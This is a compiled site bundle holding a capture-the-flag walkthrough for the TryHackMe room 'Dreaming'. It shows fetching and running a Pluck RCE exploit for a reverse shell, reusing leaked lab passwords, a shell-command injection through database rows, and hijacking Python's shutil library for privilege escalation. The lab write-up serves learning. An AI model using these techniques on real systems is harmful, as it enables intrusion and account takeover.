"use strict";(self.webpackChunk_2h3ph3rd_github_io=self.webpackChunk_2h3ph3rd_github_io||[]).push([[7749],{7552:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>i,default:()=>h,frontMatter:()=>r,metadata:()=>c,toc:()=>d});var a=s(74848),t=s(28453);const r={},i="Dreaming",c={id:"writeups/thm/dreaming/index",title:"Dreaming",description:"A writeup for the room Dreaming on TryHackMe.",source:"@site/docs/writeups/thm/dreaming/index.md",sourceDirName:"writeups/thm/dreaming",slug:"/writeups/thm/dreaming/",permalink:"/docs/writeups/thm/dreaming/",draft:!1,unlisted:!1,editUrl:"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/writeups/thm/dreaming/index.md",tags:[],version:"current",frontMatter:{},sidebar:"writeupsSidebar",previous:{title:"Devie",permalink:"/docs/writeups/thm/devie/"},next:{title:"Flip",permalink:"/docs/writeups/thm/flip/"}},o={},d=[{value:"What is the Lucien Flag?",id:"what-is-the-lucien-flag",level:3},{value:"What is the Death Flag?",id:"what-is-the-death-flag",level:3},{value:"What is the Morpheus Flag?",id:"what-is-the-morpheus-flag",level:3}];function l(e){const n={a:"a",blockquote:"blockquote",code:"code",h1:"h1",h3:"h3",p:"p",pre:"pre",...(0,t.R)(),...e.components},{Image:r}=n;return r||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Image",!0),(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.h1,{id:"dreaming",children:"Dreaming"}),"\n",(0,a.jsxs)(n.p,{children:["A writeup for the room ",(0,a.jsx)(n.a,{href:"https://tryhackme.com/room/dreaming",children:"Dreaming"})," on TryHackMe."]}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"Solve the riddle that dreams have woven."}),"\n"]}),"\n",(0,a.jsx)(r,{src:s(78546).A,height:"256"}),"\n",(0,a.jsx)(n.p,{children:"Apart from an initial small web vulnerability, all flags require basic privilege escalation techniques and to work with Python scripts."}),"\n",(0,a.jsx)(n.h3,{id:"what-is-the-lucien-flag",children:"What is the Lucien Flag?"}),"\n",(0,a.jsx)(n.p,{children:"We can start by scanning the machine with nmap."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"nmap -sS -v MACHINE_IP\n"})}),"\n",(0,a.jsx)(r,{src:s(37569).A}),"\n",(0,a.jsx)(n.p,{children:"There are only ports 22 and 80 open, but if we try to open the browser the web server we will only find the Apache default page."}),"\n",(0,a.jsx)(r,{src:s(52018).A}),"\n",(0,a.jsx)(n.p,{children:"We can try to enumerate subdirectories with Gobuster hoping to find something useful:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"gobuster dir -u MACHINE_IP -w /usr/share/wordlists/dirb/big.txt\n"})}),"\n",(0,a.jsx)(r,{src:s(10986).A}),"\n",(0,a.jsx)(n.p,{children:"If we go to /app we can see:"}),"\n",(0,a.jsx)(r,{src:s(82052).A}),"\n",(0,a.jsx)(r,{src:s(18174).A}),"\n",(0,a.jsx)(n.p,{children:"Under /app, there is a Pluck instance. Pluck is a CMS like WordPress, which could pose a vulnerability."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"http://MACHINE_IP/app/pluck-4.7.13\nhttp://MACHINE_IP/app/pluck-4.7.13/login.php\n"})}),"\n",(0,a.jsx)(r,{src:s(92169).A}),"\n",(0,a.jsx)(n.p,{children:'The Pluck homepage includes a URL for admin login. After searching online, the default password is "password".'}),"\n",(0,a.jsx)(n.p,{children:"We can now log in and see the admin panel."}),"\n",(0,a.jsx)(r,{src:s(53894).A}),"\n",(0,a.jsx)(n.p,{children:"Once logged in, most of Pluck's features are accessible. Upon further online research, it is possible to discover a Remote Code Execution vulnerability based on the admin's capacity to upload images."}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.a,{href:"https://www.exploit-db.com/exploits/49909",children:"https://www.exploit-db.com/exploits/49909"})}),"\n",(0,a.jsx)(n.p,{children:"We can download the exploit and run it with the following command:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:"wget https://www.exploit-db.com/download/49909 -O exploit.py\npython3 ./exploit.py MACHINE_IP 80 password /app/pluck-4.7.13\n"})}),"\n",(0,a.jsx)(n.p,{children:"Then, if you go to the page given in the output we will find a reverse shell."}),"\n",(0,a.jsx)(r,{src:s(53405).A}),"\n",(0,a.jsx)(n.p,{children:"Looking inside the file system, we find two interesting files in the /opt path. One is called test.py and the other is called getDreams.py."}),"\n",(0,a.jsx)(n.p,{children:'While the latter is a script for a database used by the user death with the password redacted, the former is a script used to log in to Pluck with Lucien\'s password "HeyLucien#@1999!"'}),"\n",(0,a.jsx)(r,{src:s(15826).A}),"\n",(0,a.jsx)(n.p,{children:"We can assume that it is the same password for his account and try it with ssh."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ssh lucien@MACHINE_IP\n"})}),"\n",(0,a.jsx)(n.p,{children:"It works and we are finally inside the system as Lucien and we can read the first flag."}),"\n",(0,a.jsx)(r,{src:s(83012).A}),"\n",(0,a.jsx)(n.h3,{id:"what-is-the-death-flag",children:"What is the Death Flag?"}),"\n",(0,a.jsx)(n.p,{children:"A possible solution for privilige escalation can be seen by checking the permissions of the user Lucien:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"sudo -l\n"})}),"\n",(0,a.jsx)(r,{src:s(15388).A}),"\n",(0,a.jsx)(n.p,{children:"We can see that Lucien can run the script getDreams.py as the user death without a password."}),"\n",(0,a.jsx)(n.p,{children:"For the previous script, this is stored inside the home folder of Death and it is only executable, not readable."}),"\n",(0,a.jsx)(n.p,{children:"If we try to run it we will see the output without any credentials error. We can suppose that in this version the password has not been redacted."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"sudo -u death /opt/scripts/getDreams.py\n"})}),"\n",(0,a.jsx)(n.p,{children:'The code can be obtained from the folder "/opt":'}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-py",children:'import mysql.connector\nimport subprocess\n\n# MySQL credentials\nDB_USER = "death"\nDB_PASS = "#redacted"\nDB_NAME = "library"\n\nimport mysql.connector\nimport subprocess\n\ndef getDreams():\n    try:\n        # Connect to the MySQL database\n        connection = mysql.connector.connect(\n            host="localhost",\n            user=DB_USER,\n            password=DB_PASS,\n            database=DB_NAME\n        )\n\n        # Create a cursor object to execute SQL queries\n        cursor = connection.cursor()\n\n        # Construct the MySQL query to fetch dreamer and dream columns from dreams table\n        query = "SELECT dreamer, dream FROM dreams;"\n\n        # Execute the query\n        cursor.execute(query)\n\n        # Fetch all the dreamer and dream information\n        dreams_info = cursor.fetchall()\n\n        if not dreams_info:\n            print("No dreams found in the database.")\n        else:\n            # Loop through the results and echo the information using subprocess\n            for dream_info in dreams_info:\n                dreamer, dream = dream_info\n                # !!! Here we can inject something\n                command = f"echo {dreamer} + {dream}"\n                shell = subprocess.check_output(command, text=True, shell=True)\n                print(shell)\n\n    except mysql.connector.Error as error:\n        # Handle any errors that might occur during the database connection or query execution\n        print(f"Error: {error}")\n\n    finally:\n        # Close the cursor and connection\n        cursor.close()\n        connection.close()\n\n# Call the function to echo the dreamer and dream information\ngetDreams()\n'})}),"\n",(0,a.jsx)(n.p,{children:"If we add a new dreamer or dream with specific text we can inject shell commands and run them as the user death."}),"\n",(0,a.jsx)(n.p,{children:'To do so, we need to connect to the database and add new records to it. After some investigation in the system, in the ".bash_history" file of Lucien, there is a MySQL command with the password in clear.'}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"cat ~/.bash_history\n"})}),"\n",(0,a.jsx)(r,{src:s(25763).A}),"\n",(0,a.jsx)(n.p,{children:"We can connect to the database using the same command:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"mysql -u lucien -plucien42DBPASSWORD\n"})}),"\n",(0,a.jsx)(n.p,{children:"Then we can move to the correct database:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"show databases;\nuse library;\n\nshow tables;\nselect * from dreamers;\n"})}),"\n",(0,a.jsx)(n.p,{children:"Inject a command to read the flag:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"insert into dreams (dreamer, dream) VALUES (\"'flag'\", \"''; cat ~/death_flag.txt; # \");\n"})}),"\n",(0,a.jsx)(n.p,{children:"Now, if we run again the script we will see a new line with the flag printed in the output."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"sudo -u death python3 /home/death/getDreams.py\n"})}),"\n",(0,a.jsx)(n.p,{children:'The final command that will be executed by the script "getDreams.py" is:'}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"echo 'flag'; cat ~/death_flag.txt;\n"})}),"\n",(0,a.jsx)(n.p,{children:"In this way we have found the Death's flag."}),"\n",(0,a.jsx)(n.h3,{id:"what-is-the-morpheus-flag",children:"What is the Morpheus Flag?"}),"\n",(0,a.jsx)(n.p,{children:"First things first, we can obtain the credentials of the Death user from the script getDreams.py"}),"\n",(0,a.jsx)(r,{src:s(85823).A}),"\n",(0,a.jsx)(n.p,{children:"Now we can change the user from Lucien to Death using the password\xa0!mementoMORI666!"}),"\n",(0,a.jsx)(n.p,{children:"We can try to look in the system for interesting files of Morpheus:"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"find / -type f -group morpheus 2> /dev/null\n"})}),"\n",(0,a.jsx)(r,{src:s(60153).A}),"\n",(0,a.jsx)(r,{src:s(60669).A}),"\n",(0,a.jsx)(n.p,{children:"The script restore.py is readable by all and it contains a script for the backup of the kingdom folder."}),"\n",(0,a.jsx)(n.p,{children:"This script could be used for a cron job. We could try to inject some instructions inside the shutil library and then wait for the job to work running the commands as Morpheus."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"find / -name *shutil* 2> /dev/null\nls -al /usr/lib/python3.8/shutil.py\n"})}),"\n",(0,a.jsx)(r,{src:s(20379).A}),"\n",(0,a.jsx)(n.p,{children:"The user death can edit the file by adding additional instructions in the function copy2 used by the script restore."}),"\n",(0,a.jsx)(n.p,{children:"A possible line to add is an OS call to change the permissions of the Morpheus flag."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:'os.system("chmod 777 /home/morpheus/morpheus_flag.txt")\n'})}),"\n",(0,a.jsx)(r,{src:s(42468).A}),"\n",(0,a.jsx)(n.p,{children:"After some time, we can check the permissions of the file and read the flag."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-bash",children:"ls -al /home/morpheus/morpheus_flag.txt\n"})}),"\n",(0,a.jsx)(r,{src:s(40084).A})]})}function h(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(l,{...e})}):l(e)}},37569:(e,n,s)=>{s.d(n,{A:()=>a});const a="data:image/png;base64,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